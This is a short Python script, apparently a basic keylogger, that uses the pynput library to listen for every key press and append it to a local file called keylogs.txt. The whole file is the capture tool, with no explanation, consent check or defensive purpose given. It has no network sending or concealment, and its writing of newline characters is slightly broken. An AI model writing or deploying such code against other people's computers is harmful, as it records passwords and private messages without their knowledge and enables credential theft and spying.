import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if hasattr(key, 'char'):
                f.write(f"{key.char}\\n")
            else:
                f.write(str(key))
    except FileNotFoundError:
        print("File not found")
def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
